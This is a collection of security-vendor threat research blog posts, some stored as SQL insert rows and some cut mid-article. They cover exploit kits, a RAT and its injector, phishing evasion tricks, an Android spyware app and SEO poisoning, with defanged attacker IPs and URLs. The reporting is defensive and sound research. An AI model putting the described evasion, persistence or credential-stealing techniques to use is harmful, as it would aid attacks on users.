Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers and deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors. What follows are highlights from the EK activity we observed during the last quarter.         RIG EK    RIG EK has been the most active exploit kit in the past, but its activity has decreased in comparison to previous quarters. We saw various payloads delivered by RIG EK, from ransomware to banking Trojans. The graph below shows the hits representing RIG EK activity.        Figure 1: RIG EK hits from 15th October 2018 to 15th January 2019    The geographic distribution for RIG EK hits is shown below.        Figure 2: RIG EK heat map shows showing infected regions    One instance of the RIG EK cycle is shown in the figure below.     Figure 3: RIG EK infection cycle    The obfuscated JavaScript on the landing page can be seen below.        Figure 4: RIG EK landing page, obfuscated JavaScript    We observed the use of CVE-2018-8174, which targets a VBScript engine to attack the victim\'s machine. A Flash-based exploit, CVE-2018-4878, was also used, affecting Adobe Flash version 28.0.0.137 and earlier versions.    Decompiling the Flash file, we can see the CVE-2018-4878 code, shown below.        Figure 5: Decompiled Flash exploit in the current RIG EK cycle; CVE-2018-4878    We can see that the threat actors have tried to mask the function names, which were visible last quarter, as shown in the screen below.        Figure 6: Decompiled Flash exploit in previous quarter RIG EK cycle; CVE-2018-4878    Different payloads were observed during the quarter, with GrandCrab ransomware being served at the start of the quarter and Trojans being served towards the end.         GrandSoft EK    GrandSoft EK is an old exploit kit that has been showing some recent activity. This EK is being served through malvertisement redirects.        Figure 7: GrandSoft EK hits from 15th October 2018 to 15th January 2019    The geographical distribution of GrandSoft hits can be seen below.        Figure 8: GrandSoft EK heat map shows infected regions, primarily in Asia    The threat actors make small changes to the URL pattern as shown in the image below.        Figure 9: GrandSoft EK Cycle with URL \"getversionpd\"             Figure 10: GrandSoft EK cycle with the URL \"getversoinpd\"         We saw no changes in the landing page, and we saw that the CVE-2016-0189 VBScript memory corruption vulnerability was still being used to exploit the victim. A snippet of the GrandSoft EK landing page is shown below.        Figure 11: GrandSoft EK landing page    The payloads we observed included a password stealer and Trojan malware, including Azorult, which differed from the GrandCrab ransomware we saw in previous quarters.         Fallout EK    Fallout EK is relatively new, showing activity since early last quarter. The EK redirects victims using multiple HTTP 302 redirects and then sends the user to the Fallout EK landing page. Users are mainly targeted by malvertisement campaigns.          Figure 12: Fallout EK hits from 15th October 2018 to 15th January 2019    The geographic distribution for the Fallout EK is shown below.        Figure 13: Fallout EK heat map shows infected regions    We can see one instance of a Fallout EK chain in the figure below.        Figure 14: Fallout EK infection cycle    We can see the initial HTTP 302 redirects from 185.231.69[.]225 and 51.15.98[.]59, which leads to the Fallout EK landing page.    The screenshot of the obfuscated landing page is shown below.        Figure 15: Fallout EK landing page     The payload seen with the Fallout EK was GrandCrab ransomware.        Figure 16: GrandCrab ransomware infection through Fallout EK         Other exploit kits    We observed Magnitude EK activity in Southeast Asia, but other exploit kits like Terror EK, Disdain EK, and Kaixin EK are no longer showing any activity. Underminer EK is another exploit kit seen in past quarters, but we have not seen a full cycle for it in the current quarter.         Conclusion    Exploit kits can infect a victim\'s machine during web browsing without the user’s knowledge. The attackers monetize successful infections by collecting a ransom for retrieving data encrypted by ransomware, mining cryptocurrencies using the victim\'s system resources, or installing Trojans to steal a victim’s identity. Attackers frequently change their techniques by obfuscating the source code or integrating new exploit code into their EK, and security researchers analyze and block the new threats by tracking changes in the EK behavior.     To help avoid infections from exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements.

The installation path and other details are stored in encrypted form using AES encryption (Fig. 1), and the decryption key is hardcoded.    Fig. 1: AES decryption function    The payload and decoy PDF is encrypted and stored in the resource section, and a custom encryption method has been used. The decryption key is hardcoded (Fig. 2).    Fig. 2: Extracting decoy PDF and payload    The decoy document claims to be an India Overseas Bank NEFT transaction statement.

Fig. 5: Unhandled exception popup    This error is due to the injector code not being able to inject the overlay part of the payload, the part that contains the command-and-control (C&C) server details. As shown in the injection code snapshot below, it allocates memory in a target process similar to the size of image length defined in the PE header of payload (Fig. 6). This means Mjag will not be able to properly inject payloads (like Punisher RAT) that contain important data in the overlay.      Fig. 6: Injector code    For the purpose of this blog we patched the memory mapping issue and continued our analysis of the infection cycle involving Punisher RAT.    Analysis of Punisher RAT    Punisher RAT is packed and written in .NET. The Punisher RAT builder is publicly available and can be configured with a range of features. In the builder (Fig. 7), you can configure the server IP, name, password, and listening port. The RAT will communicate on the given server IP and send all the information stolen from the victim’s machine. There is also a feature to add more functionality in binary, including anti-VMware, anti-AV, sandbox detection, and USB spread for further infection, among others.    Fig. 7: Punisher RAT builder    During analysis, we saw various functions of this malware, including:    1. Password stealing module    The malware hunts for various application data and steals the credentials. Here (Fig. 8), it is trying to steal the stored login credentials for the Chrome browser. The stolen information will look like:    |URL| http://facebook.com    |USR| username or e-mail    |PWD| userpassword        Fig. 8: Stealing module    The Punisher RAT attempts to steal sensitive data from the following applications on the infected system: Filezilla, No-IP Dynamic Update Client, Dyn DNS, Paltalk, FireFox, Chrome, Hotmail, Yahoo, Opera, and Internet Explorer.    2. Anti-task manager    The malware checks for the following applications’ processes, and does not allow these applications to terminate any other processes running on the user\'s system.      	Process Explorer  	Process Hacker  	Task Manager      This allows malware author to ensure that the malware processes cannot be terminated. Fig. 9 shows that while attempting to kill \'a.exe\' process using the Process Explorer, the “OK” button will be replaced by an “Error” button.    Fig. 9: Anti-task manager         3. Keylogging     The malware can capture keystrokes (Fig. 10) and store the data into the %AppData%/{random digits}.log file.    Fig. 10: Capturing keystrokes         4. Persistence     The malware copies itself in the startup folder and creates a run key of this location.    HKCU\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run         5. Spreading vector    It looks for a removable drive and CD-ROM for infection and creates an .lnk file.    Below (Fig. 11) depicts the spreading mechanism through a USB device.        Fig. 11: USB spread         6. AV checks    The Punisher RAT checks for installed AV software (Fig. 12) and updates to the server.    Fig. 12: Checking AV    Network activity    The hardcoded C&C information (Fig. 12) is extracted from the payload, and it will split the data with the delimiter “abccba.”    Fig. 13: C&C server information         It also collects the information about the multiple running processes:    AW|BawaneH|Process Explorernj-q8    AW|BawaneH|Notepadnj-q8    The table consists of extracted C&C information from the payload.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (12, '2019 Will See Cybercriminals Eye Opportunities in Cryptocurrency and IoT to Launch Their Attacks', 'Deepen Desai', 'December 13, 2018', 'Cybercriminals never take vacations. They’re always scanning the horizon to see which new technologies are being adopted by legitimate enterprises and are therefore ripe to be exploited, or how to utilize trusted protocols to steal credentials of unsuspecting consumers. The coming year will be no different, but the tools in some cases will change. Here are my predictions for the cybercrime trends that will get our attention in 2019.    Prediction #1: Malware operators will cash in on cryptocurrency    We’ll continue to see more and more malware operators make money on cryptocurrency, either by mining coins using infected systems or by stealing cryptocurrency from the infected systems. This will involve new and existing malware strains that will add cryptomining and stealing functionality. The three most common types of crypto-malware include cryptominers, wallet stealers, and clipboard hijackers, and we expect to see an increase in all three types. Here’s how they work:    When downloaded, cryptominer malware works in the background to steal CPU cycles that can mine and generate digital currency like bitcoins without users’ knowledge or consent. By spreading their malware across thousands of machines, the miners form a mining pool that can result in big payoffs for the malware author. In 2018, cryptomining surpassed ransomware to become one of the top threats, and that trend is expected to continue.    Wallet stealing will increase, too, in both frequency and sophistication. Wallets don’t store the cryptocurrencies; instead, they store credentials to access or spend the money, which is stored in blockchain. Expect to see new variants that contain the functionality to locate and steal wallet.dat files.    Clipboard hijacking is another recent innovation. Because cryptocurrency wallet addresses are long, random-looking sequences of alphanumeric characters, they are difficult to remember. Almost all cryptocurrency owners copy and paste their wallet address for making transactions; on an infected system, malware can monitor for cryptocurrency transactions and dynamically change the wallet address on the clipboard to that of the malware operator so that future transactions benefit the malware operator.    Prediction #2: SSL/TLS-delivered threats will become more common    We’ve seen steady growth in overall SSL/TLS-encrypted traffic this year, which now accounts for almost 75 percent of total enterprise traffic going through the Zscaler cloud. Cybercriminals are leveraging this encrypted channel at all stages of the cyber kill chain. In particular, there has been a sharp increase in phishing attacks and malware payload delivery over encrypted channels. In the latter half of 2018 alone, we saw that 35 percent of phishing content was delivered over encrypted channels, representing a 300 percent increase since 2016.    Though the volume of SSL/TLS-encrypted traffic has risen sharply, much of it is going uninspected, either because it’s assumed to come from trusted sources or, more likely, because of the impact inspection would have on network performance. Attackers can now hide malware in encrypted traffic knowing it is not likely to be inspected.    In 2019, we will continue to see SSL/TLS utilized by cybercriminals to launch attacks, and we anticipate an increase in phishing attacks and malware payload deliveries over these channels, as cybercriminals take advantage of the assumed trust in encryption as well as the ease with which they can obtain digital certificates.    Prediction #3: IoT threats will have a greater impact on enterprises    IoT footprints in the enterprise network have grown rapidly over the past few years, and these internet-connected devices can pose significant risks to enterprise networks. We will continue to see cybercriminals leverage IoT devices as a beachhead to large-scale attacks against enterprise networks.    Some of the largest attacks on record are the result of hackers using IoT devices to carry out massive distributed-denial-of-service (DDoS) attacks (you can read about some of them here and here). IoT devices have notoriously poor security with known default passwords that are rarely ever changed, and manufacturers are slow to patch vulnerabilities.    In addition to employee-owned devices coming into the workplace, organizations are adding hundreds or even thousands of IoT devices to their environments, such as cameras, printers, IP phones, televisions, kitchen appliances, thermostats, and more. Besides the potential for DDoS attacks, IoT vulnerabilities are being used by attackers as an entry point to a network, in which they can hop from one vulnerable device to the next, undetected.    One an attacker gains a toehold into a network through a compromised device, it can be used for spreading malware, stealing credentials, leaking data, and sniffing traffic. Unfortunately, until manufacturers take the threat seriously and bake security into their devices, the attacks will continue to rise in 2019 and beyond.    The US-CERT (United States Computer Emergency Readiness Team) has provided security tips for IoT devices here.    Prediction #4: Supply-chain attacks will grow    There has been a steady increase in software supply-chain attacks in recent years. These attacks used to be targeted in nature, singling out a specific industry or organization, such as government. However, we’re seeing software supply-chain attacks used for commodity malware as well, which has the potential to impact larger numbers of users. We will see cybercriminals continue to focus on attacking critical software supply-chain infrastructure to conduct larger attacks.    An example of the fast and massive damage that a software supply-chain attack can inflict is the June 2017 NotPetya attack. The initial infection was through an accounting software website and, by the end, it had wiped data from many thousands of computers around the world at banks, energy firms, governments, and more. Not only is a company’s valuable data and IP at risk, so too is their reputation—which in the end hits its bottom line. NotPetya appeared to be a state-sponsored attack, but most supply-chain attacks are the result of poor security hygiene, which attackers are always prepared to exploit.    Prediction #5: Criminals will turn their attention to cloud service providers    The increase in cloud adoption has shifted a lot of workflows to the cloud. With that shift, we’ll see more attacks aimed at infiltrating cloud service providers in an attempt to gain access to valuable data from the organizations using the cloud services. These attacks may have a far-reaching impact, in light of the volume of data companies are storing in public clouds, and they can pose severe financial consequences.     The cloud service providers themselves have invested heavily in security protections and have large security teams to ensure their systems are sound—they are far more secure than the typical enterprise data center. But most cloud services and their configurations are new and evolving, and mistakes, such as the widely publicized S3 bucket misconfigurations, have led to the exposure of sensitive data at many organizations. But the most common source of errors leading to data leaks or the spread of malware is the end-user. While your cloud storage system may be impenetrable, there is always the risk that employees will be careless with their credentials, enabling bad actors to access your valuable data. In 2019, we expect to see an increase in social engineering attacks aimed specifically at employees accessing cloud applications.', '', 'https://www.zscaler.com/blogs/research/2019-will-see-cybercriminals-eye-opportunities-cryptocurrency-and-iot-launch-their-attacks');

The team had been seeing an increase in a variety of phishing activities, with targeted attacks and faked login pages designed to steal the credentials of unsuspecting shoppers. (You can read their informative report here.)    With Black Friday and Cyber Monday behind us, we decided to take another look at the data to determine the volume of shopping activity across our cloud and the expected rise in threat activity that coincides with major online events.    What we found was that Cyber Monday was, indeed, the biggest shopping day of the year on our cloud and elsewhere. According to the National Retail Federation, 50 million people shopped online in the U.S. alone. Amazon reported that Cyber Monday was its biggest shopping day in history, and over the five days from Thanksgiving through Monday, Amazon customers bought more than 180 million items.    What we saw more than a billion times    We can attest to the high volume of shopping activity. On Cyber Monday, the Zscaler cloud processed 1.35 billion internet requests on shopping sites, with the highest volume by far on Amazon, at 372,824,847 requests. While Monday’s shopping traffic only represented 2.18 percent of traffic overall on our cloud, it was 72 percent higher than shopping traffic on a typical day.    Cyber Monday top five shopping sites on the Zscaler cloud:        Number of requests we processed on Cyber Monday\'s top shopping sites.    With so much shopping activity, you might think that Black Friday and Cyber Monday would be the days that cybercriminals would crank up the volume, launching phishing attacks and spreading malware to online shoppers. But the traffic patterns on our cloud show otherwise.    Phishing attacks are planned and executed with precision    On Cyber Monday, we blocked a total of 2,337,537 phishing attempts. That’s significant, but that number was actually down from the days before Black Friday, and this decrease is consistent with patterns we’ve seen. Attacks peak in the days leading up to major events or shopping days. Attackers plan their phishing campaigns for the days when potential victims are looking for deals, aligning their attacks with mainstream advertising campaigns. On the “big day,” when shoppers have already decided what sites to visit, the attacks drop off accordingly.    On the three days before Thanksgiving, we blocked the highest numbers of phishing attempts, with a peak of 4.4 million on Wednesday. By Black Friday, attacks had dropped by nearly 30% from the high. They continued to decrease in volume through Monday when attacks were down 46% from Wednesday.    November graph shows daily phishing attempts on the Zscaler cloud    Why did attacks drop on Cyber Monday?    It’s been a long time since hackers could be stereotyped as nerds in the basement using their programming skills to bootleg videos. Today’s criminals are sophisticated in their technical execution and in their understanding of market drivers and user behavior. They operate their campaigns like big businesses—because they are. They know when you’re most likely to be online and when you’ll be sifting through the most email (Monday is the most popular day for phishing attacks). They know you’re more likely to open tracking slips or invoices than an unknown attachment. And they exploit the trust you have in brands like Amazon, Kohl’s, Bank of America, and many others, by creating fake websites that look just like the real thing.    Consumers must change their online behavior accordingly, approaching each online interaction with an awareness of its potential risk. You can’t assume that attachments are safe, even if you recognize the name of the sender; spoofing names is practically effortless. You can’t assume that text messages are safe either, due to the rise in SMS phishing. So-called “SMiShing” links can take you to compromised websites, just as infected email attachments can. E-commerce websites can be compromised in a variety of ways. Hackers can inject JavaScript into a site and the script sends data collected in the input fields to the hacker’s remote server. A favorite tactic is creating sites that look like legitimate sites but are designed to steal your personal information.    Can you tell the difference between these two Amazon login screens?        The screen on the left is a login for a phishing site that will collect your personal information, including credit card number, and you’ll think you’re on the Amazon site the whole time. The one on the right is a real Amazon login screen. The only difference is in the address bar. Be sure the site you are on matches the URL address.     We also know, as we stated earlier, that today’s cybercriminals plan their campaigns with a marketer’s precision. It’s wise to take extra precautions leading up to and during big events or news days (another day in November when we saw a surge in phishing activity was the sixth, the U.S. election day).    Three things you can do right now to protect yourself from phishing:      	Check the authenticity of the URL or website address before clicking on a link; make sure the address matches the site you\'re visiting  	Ensure online retailers and banking sites use secure connections; the URL should start with HTTPS  	Inspect the source of emails with enticing shopping deals; be wary of all links and attachments      More resources:    Read the ThreatLabZ Phishing Roundup blog for an analysis of current phishing trends    Download the infographic:', '', 'https://www.zscaler.com/blogs/research/cyber-monday-biggest-day-cyberattacks-not-long-shot');

The most glorious of shopping seasons has arrived, and users have commenced their annual tradition of flooding e-stores in search of the best deals that their money can buy. Threat actors, keen to take advantage of increased seasonal shopping activity, are deploying targeted phishing campaigns and site skimmers in the hopes of cashing in. The spectrum of attacks is reaching users in nearly all aspects of their online presence. Email, tweets, and websites are all vehicles of abuse. Zscaler has seen a steady rise in phishing attacks leading up to Black Friday and Cyber Monday, and we\'ll provide an overview of them here.        Fig. 1: Malicious activities from mid-October through mid-November. The turquoise bars represent targeted phishing attacks.    Targeted phishing    Examining one of the targeted phishing campaigns illustrates the need for caution when shopping online. The faked Amazon screen provides the perfect example, because Amazon is probably the most prolific online shopping site used during the holidays. Aside from the address bar, it\'s a relatively good knock-off.        Fig. 2: Faked Amazon sign-in form.    This attack doesn’t stop at compromising your Amazon credentials. This site also wants your credit card information!        Fig. 3: Faked Amazon billing page.    A closer look at this attack shows that the attackers don’t even have the decency to encrypt your stolen credentials.        Fig. 4: Wireshark exposes the packets moving between client and server over HTTP.    The best defense is to always be conscious of the address bar. A store like Amazon is never going to ask you for sensitive information away from the Amazon site.    Site skimmers    Other sophisticated attacks that have proven to be even more insidious are site skimmers like MageCart. MageCart refers to a hacker group that is responsible for large-scale attacks on e-commerce sites. MageCart will compromise a well-known or trusted site and inject malicious, obfuscated JavaScript that can tap into purchases. The injected script will add a form to the payment page at runtime using Document Object Model (DOM) properties. Information skimmed from this attack can include all the personal information requested by the compromised e-commerce page.    More information about this type of attack is detailed in another blog. Despite several security vendors taking notice, users are still being impacted daily. An updated chart on MageCart hits since our September 28 blog shows that this advanced attack is not stopping anytime soon.        Fig. 5: MageCart activity between September 20 and November 15.    The best defense against this threat is to have a malware detection tool that is inline with the browser. These tools have the best chance of detecting the malicious JavaScript code on an online store\'s page.    Cryptocurrency Mining    The final attack we\'ll review is the use of cryptojacking. Unlike the other attacks discussed, cryptojacking does not target the user\'s sensitive information but rather their system resources. A small piece of javascript can be injected into a page which will leverage the user\'s browser processes to mine cryptocurrency for the attacker. Attackers will leverage user susceptibility to the shopping season to bolster their cryptowallets.        Fig. 6: An online shopping aggregator linking to Amazon, but redirecting user\'s to mine Monero Cryptocurrency    Behind the scenes of this shopping site, lies a small piece of javascript that redirects the user\'s system resources to mine cryptocurrency through the application, CoinHive.        Fig. 7: Coinhive injection script will use the user\'s system resources to mine the cryptocurrency, Monero.    The best defense against this kind of attack is to use javascript blocking browser applications like ScriptSafe or NoScript to toggle what sites may execute javascript.     Conclusion    The ThreatLabZ team at Zscaler works diligently to ensure that customers do not fall victim to malicious activities described above. Users should be cautious and protect themselves by reviewing our security checklist, particularly during the shopping season:      	Check the authenticity of the URL or website address before clicking on a link  	Ensure online retailers and banking sites use HTTPS/secure connections  	Do not use unsecured public Wi-Fi for shopping  	Inspect the source of emails with enticing shopping deals; be wary of any suspicious attachments  	Steer clear of unofficial mobile application stores  	Use two-factor authentication whenever possible, especially on sensitive accounts such as those used for banking  	Always ensure that your operating system and web browser are up to date and have the latest security patches installed  	Use browser add-ons like Adblock Plus to block popups and potential malvertisements  	Use browser add-ons like No Coin to block a site\'s attempts to use your computer for cryptocurrency mining  	Back up your documents and media files  	Review the Identity Theft Guide and FAQs from the Federal Trade Commission  	Review the  National Cybersecurity and Communications Integration Center\'s (NCCIC) Holiday Scams and Malware Campaigns warning and recovery actions message      Wishing you all a very happy, healthy, and safe Thanksgiving!

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (15, 'Zscaler ThreatLabZ Phishing Roundup', 'Deepen Desai,', 'November 20, 2018', 'Phishing is an attempt to steal personally identifiable information, such as Social Security numbers, credit card details, date of birth, and other sensitive data. Typically, phishing targets a user with an email containing a link to a website that imitates a legitimate website the user might visit. As users have become savvier about their online practices, the developers of phishing sites have upped their game, too, and many of the sites we see are carefully designed to look like the sites they’re imitating, and clever tactics are used to trick potential victims.    In this blog, we will share some insights from phishing activities blocked across the Zscaler™ cloud. We’ll cover the top brands and categories we are seeing targeted by phishing campaigns, recent examples of campaigns, and some of the tactics being used by threat actors to be more successful.    Types of phishing    There are different types of phishing activity, including:    Spear phishing, in which the phishing attempt is targeted against certain organizations or individuals working for specific companies.    SMiShing, also known as SMS phishing, which involves a message (SMS communication) that targets victims and entices them to click on URLs hosting phishing websites.    Whaling, in which threat actors target high-profile individuals, such as senior executives in a company, most often to gain internal company information that is not public knowledge.    What brands are being targeted?    While it might be easier to spoof the sites of lesser-known brands, where differences wouldn’t be so apparent, the actors trying to steal personal information need to impersonate popular sites for maximum return, raising the odds of snaring a victim. Their phishing sites often feature the biggest brands, and they use a variety of tricks to evade detection, which we’ll describe in this report. Some of the most commonly targeted brands we’ve seen in the recent phishing campaigns can be seen below:        Fig. 1: Top phished brands in the Zscaler Cloud    Microsoft tops the list partly because of Microsoft’s multiple enterprise web properties, such as OneDrive, Office 365, Outlook Web Access, among others, being targeted by the threat actors. Microsoft was followed by Facebook and PayPal in the list. In addition to the known brands, it was interesting to see phishing campaigns targeting Travel Visa portals (Canadian Visa and Australian Visa, for example) included in our top five most targeted brands. The attackers in this case were most likely interested in phishing for sensitive immigration information, such as passport details, date of birth and national identification numbers.    The top five most commonly targeted application categories we saw in the recent phishing campaigns include:    Communications (41.4%)    Social media (18.3%)    Finance (16.7%)    Travel (12.4%)    Dating (3.4%)         Fig. 2: Top phished site categories in the Zscaler Cloud    Delivery of phishing content    The majority of the phishing campaigns start with an email or message containing a link to a site hosting the phishing page. If the user clicks on the link, the phishing page is delivered. We have seen an increasing number of phishing attempts being delivered over an encrypted channel (HTTPS) -. We believe this increase is most likely due to the availability of domain validated (DV) SSL certificates. These certificates are easy to obtain from free SSL cert providers like Lets Encrypt as well as commercial Certificate Authorities. Multiple commercial CAs also offer free DV SSL certs with shorter validity periods with the expectation that the client will purchase a paid certificate once those expire. However, these offers provide a safe haven for cybercriminals who often leverage these short-term certs to deliver malicious content and then discard them.    About 65 percent of all phishing content we’ve seen in the past three months was over HTTP and the remaining 35 percent was over HTTPS. This represents a 300 percent increase in phishing content being delivered over HTTPS since 2016.    A look at recent phishing examples:    Chalbhai campaign    We continue to see a known phishing campaign using the tag chalbhai in its form statements. This campaign has been targeting users with phishing pages that mimic American Express, Microsoft Office, and Adobe, seasonal campaigns like fake IRS and TurboTax webpages during tax season and more recently holiday shopping season pages. A sample of this tag being used on a Wells Fargo phishing page is shown below.        Fig. 3: Chalbhai tag shown in the source code    Usage of compromised sites    Below is an example of a legitimate site that is compromised and the attacker has hosted multiple phishing sites on the compromised domain. The screenshot shows the open directory found on the compromised web server.        Fig. 4: Compromised web server    The two screenshots that follow are phishing pages designed to look like pages of legitimate websites, including a single sign-on page for Abilene Christian University and a Bank of America page.        Fig. 5: Faked SSO for Abilene Christian University        Fig. 6: Faked Bank of America page    If the user falls for these phishing pages, the credentials are harvested and posted to the attacker controlled location.    Evasion and Anti-Analysis Techniques    1. Use of images instead of content    The phishing websites are usually cloned copies of the legitimate sites. The difference in the case of Bank of America is that the faked page is almost entirely made up of a single image with a simple credential login form. This helps to evade engines running heuristics on the page source code.    2. Preventing access to page source    A simple anti-analysis technique used by scammers is disabling the right click functionality to prevent users from checking the page source. This can be seen in the phishing page below, which is pretending to be an Adobe Online document.        Fig. 7: Malicious Adobe Online document     3. Filtering based on User IP address, Host Names, and User Agent strings involved in the request    We’ve also observed malicious actors trying to fingerprint and serve phishing content based on the user’s IP address, host names, and user agents. We can see an example in the snippet below where the attacker is maintaining a list of IP addresses, hostnames and User-Agent strings known to be used by security researchers and analysts while attempting to get the phishing. If any request to the phishing site arrives from one of the known IP addresses or hostnames, or has one of the listed User-Agent strings then the phishing page will not be served. This tactic helps the attacker to keep the phishing page content undetected for a longer duration.        Fig. 8: Banned source IP addresses, hostnames and User-Agent strings    4. Exfiltrating information as an image instead of content    We have also seen multiple instances of phishing attacks that prompt users to verify their identity by asking them to upload a copy of their ID, as shown in the code below.         Fig. 9: Coded to prompt users to upload identification card    The sensitive user information in this case is being stolen in the form of an image which will bypass content based data loss prevention engines.    5. Encrypted Phishing    We have also seen a few phishing pages that use encryption to hide the source code in an attempt to evade detection by security engines. One such example, for a faked PayPal page, is shown below.        Fig. 10: Encrypted source code for a phishing page    6. Punycode based hostnames    We have also seen attempts to use punycode, in which threat actors use homograph techniques to construct a URL that looks like a legitimate URL, but uses characters in non-English language character sets to trick the user. (See our Punycode blog for examples of this technique.). This technique makes it difficult for reputation based engines to keep up.    Anatomy of Scam Page creation    Let’s now take a look at how typical scam web pages are created to perform financial fraud and phish for sensitive information. Attackers copy website templates to create scam websites making the scam pages look very similar to the original as seen below:        Fig. 11: Scam websites are built using templates to mimic legitimate sites    Most of the time, the fakes would include small changes to evade detection, like changing the names of the doctors on the following page but the site is identical otherwise.        Fig. 12: Small changes that help attackers evade detection    The scam websites even have live chat support, which responds to queries and guides users through the payment process. The photos of doctors were taken from a royalty-free stock photography database. When checking the source code in the Fig 11 example, we found that the contents were copied from a legitimate site, santabarbaraherbclinic[.]com, and we can see the timestamp in the screenshot below.        Fig. 13: Source code in scam website shows copied content from a legitimate site    Conclusion    Phishing attacks have been on the rise over the past few years. As the end users become more vigilant against clicking suspicious links, attackers have also upped the ante by evolving the way in which the phishing content is being delivered as well as tactics being leveraged to make the phishing pages stay undetected for longer period.    While in this blog we focused mainly on commodity phishing and scam pages, some of the tactics mentioned here are also commonly seen in many of the targeted phishing campaigns (Spearphishing, Business Email Compromise, etc).

It also asks to register itself as default keyboard. By doing so, it can log every keystroke entered by the user.          	  		  			  		  		  			Fig 2: Initial activities  		  	           During our analysis, we received a 404 error from the app’s command and control (C&C), which may have been a ploy or may have simply meant that the services were not available at the time of analysis. We decided to look further and found several permissions being asked that did not align with the name or purported function of the app. The screenshot below shows the list of permissions asked by the app.         	  		  			  		  		  			Fig 3: Android permissions  		  	           Once the setup was done, the app registered and started some services and broadcast receivers. Android services are components that can run in the background without user interaction, and the Android BroadcastReceiver is a component that can be made to trigger when certain system events occur, such as presenting an alert when the battery is low.    This spyware registers a broadcast receiver named ReciverHandler. This receiver is registered to execute upon following events:       	Outgoing Call  	Connectivity Change  	Change of Phone State  	Package Added/Removed/Installed   	Power Disconnect/Connect  	SMS Received  	SMS Sent  	Boot  	Screen ON/OFF      Depending upon which of the above events occurs, the spyware is designed to trigger particular services. We found that this app used the following Android services:       	Call Record Service  	Record Service  	Geofence Service  	App location Service  	MyKeyboard Service  	Clipboard Monitor Service  	Basic Info Upload Service  	File Upload Service   	Upload Service       Call Record Service and Record Service are responsible for recording the victim’s calls. The screenshot below shows this functionality.         	  		  			  		  		  			Fig 4:  Call recording  		  	           Geofence Service and AppLocation Service are responsible for fetching the victim\'s location. A snippet from the service can be seen below:         	  		  			  		  		  			Fig 5: Location tracing  		  	           Clipboard Service is responsible for stealing everything that is copied/pasted by the victim. The app creates a file named clipboard.txt in which the app stores all copied data. Copied data is also uploaded to the server, as shown in the following screenshot.         	  		  			  		  		  			Fig 6: Clipboard service   		  	           The app also tries to steal the victim\'s SMS messages as shown below:            	  		  			  		  		  			Fig 7: SMS stealing  		  	           Once every detail is collected, the data is saved in database locally and then sent to the C&C. These functions are achieved with the BasicInfoUpload Service, FileUpload Service, and Upload Service.     As we researched package names, app certificates, and statically collected data, we discovered that this spyware had been uploaded to Google Play in past with the name Soulmate (Beta) and a different package name (com.perfekt.ats.perfektsoulemates). It was taken down immediately. We also came across a lot of advertising for spyware apps that enable users to spy on loved ones. Some of these ads are shown below.         	  		  			  		  		  			Fig 8: Spyware advertisements  		  	           These advertisements took us to the developer\'s official website, apps[.]kikde[.]com. KikDe  promotes itself as a company that provides services to develop websites, Android apps, iOS apps, Windows apps, SEO (Search Engine Optimization), and more. On the KikDe website, we found references to another company called American Transportation System LLC. Tracing this company, we ended up on a third-party website that was still hosting some of its apps. All these apps contained the word  “perfekt” in their titles and it soon became clear that the earlier app named Soulmate was uploaded by this same entity. Other apps by this developer can be seen in the screenshot below along with comparisons to the same apps with different names on Google Play:          	  		  			  		  		  			Fig 9: Third-party vs. Google Play apps  		  	           Other apps from this developer were also highly suspicious. For example, Kikde OTP Monitor could be used for forwarding an OTP (One Time Password) to another mobile device. Kikde Secure+ Keyboard was more of a keylogger. We are continuing our analysis of these apps and will report our findings.          Conclusion     It is always advisable to stay away from “spying” apps. They do have some legitimate use cases, such as parents keeping track of the whereabouts of their children. But as we’ve seen with Soulmate, users can’t be sure of what is happening under the hood, and the user who is spying may actually be the one who is spied upon.    When considering apps to download, users should always exercise caution. Some apps might have good ratings and favorable reviews, but that is not reason enough to trust them, because such ratings and reviews can easily be supplied by the attackers themselves using other identities.     Zscaler protects users from spyware and other malicious apps that call out to C&C servers.', '', 'https://www.zscaler.com/blogs/research/soulmate-dating-app-spies-you');

There are different ways to implement SEO poisoning, such as keyword stuffing, the use of hidden text, and cloaking, among others. In addition to manipulating search ranking, SEO poisoning is widely used to redirect users to unwanted applications, phishing, exploit kits and malware, porn, advertisements, and so on.     The ThreatLabZ research team has been actively tracking SEO poisoning campaigns; in this blog, we will share some recent examples and an analysis of the techniques used.     “Midterm elections” campaign    Attackers often use holidays and other timely occasions that are likely to generate a lot of search interest. For this analysis, we chose to focus on the upcoming U.S. election. In the following screenshot, there are three SEO poisoned URLs in the Google search result for the keyword “midterm elections.”         Fig. 1: SEO poisoned URLs in Google search         After about a month of looking at this “midterm elections” SEO poisoning campaign, we found more than 10,000 compromised websites with more than 15,000 keywords, and we continue to find hundreds of newly compromised sites involved in this activity every day.    Use of multiple redirects    Let’s take a look at some specific URLs generated by the following SEO poisoning campaign:    websitedukkani[.]com/enj0qnh/godev3a.php?snlhpyouf=midterm-elections-2018-polls    The Google cache for the above URL is shown below, and you can see that the Google crawler got a junk page loaded up with many uses of the keyword “midterm elections.”         Fig. 2: Google crawler loaded with keywords    But as we browse this URL in Chrome, we discovered that it may be redirected to this page:        Figure 3: SEO poisoning landing page example    We say “may” because the redirected website is different each time.    We also noted that it goes through a series of redirects before landing on the final page, as shown in figure 4 below. This is just one of the many measures that cybercriminals are using to deter automated crawlers from adding detection for the landing pages.    In our example, the user goes through two redirects via the “302 Found” response code before getting to a real page, as shown in figure 3:    Redirect URL #1 - 5[.]45[.]79[.]15/input/?mark=20180314-landlordpeace.com/0fuq&tpl=9&engkey=how+to+login+to+zscaler         Redirect URL #2 - www[.]hitcpm[.]com/watch?key=027ed88f05536b6c1a41df968c0abb52        Figure 4: The web page content of the last redirect    The final landing page that the user sees will be different every time; in our case the user was served the following web page:    